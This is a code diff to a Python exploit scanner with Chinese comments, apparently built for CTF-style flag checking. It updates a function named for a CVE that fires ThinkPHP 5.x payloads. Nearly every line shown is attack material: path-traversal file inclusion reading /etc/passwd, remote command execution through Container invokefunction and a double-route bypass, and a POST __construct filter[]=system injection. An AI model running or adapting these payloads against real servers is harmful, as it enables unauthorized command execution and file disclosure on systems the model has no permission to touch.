@@ -80,6 +80,8 @@ def build_url(base: str, path: str) -> str:
 
 def flag_match(resp: requests.Response, flag: str) -> Tuple[bool, str]:
     """检查 flag 是否出现在响应中，返回 (命中, 上下文片段)"""
+    if not flag:  # 空 flag 永远是误报
+        return False, ""
     if flag in resp.text:
         idx = resp.text.find(flag)
         snippet = resp.text[max(0, idx - 15):idx + len(flag) + 100]
@@ -502,21 +504,21 @@ def check_cve_2025_50706(url: str, s: requests.Session) -> List[str]:
         # route 路径穿越 → 文件包含
         ("/index.php?s=index/\\think\\route/dispatch&file=../../../../../../../../etc/passwd",
          "root:", "route 路径穿越 /etc/passwd", 'GET', None),
-        # Lang 文件包含 (5.1 通杀)
-        ("/index.php?s=index/\\think\\Lang/load&file=../../test.jpg",
-         "", "Lang 文件包含", 'GET', None),
+        # Lang 文件包含 — 用 /etc/passwd 验证实际文件读取
+        ("/index.php?s=index/\\think\\Lang/load&file=../../../../../../../../etc/passwd",
+         "root:", "Lang 文件包含 /etc/passwd", 'GET', None),
         # Config load 文件包含
-        ("/index.php?s=index/\\think\\Config/load&file=../../test.php",
-         "", "Config 文件包含", 'GET', None),
+        ("/index.php?s=index/\\think\\Config/load&file=../../../../../../../../etc/passwd",
+         "root:", "Config 文件包含 /etc/passwd", 'GET', None),
         # 5.1 Container → 直接 RCE (作为 routecheck 绕过)
         ("/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
          flag, "5.1 Container RCE (route bypass)", 'GET', None),
         # 5.1 双 s 参数绕过
         ("/index.php?s=index/index/index&s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
          flag, "5.1 双参数路由绕过 RCE", 'GET', None),
-        # POST 路由检查绕过
-        ("/index.php?=PHPFILTER", "", "5.1 PHP filter 链", 'POST',
-         {'s': f'index/\\think\\Request/input&filter=system&data={cmd}'}),
+        # POST 路由检查绕过 — 用 flag 验证命令执行
+        ("/index.php", flag, "5.1 PHP filter 链 (POST)", 'POST',
+         {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd}),
     ]
 
     for path, expected, desc, method, data in payloads:
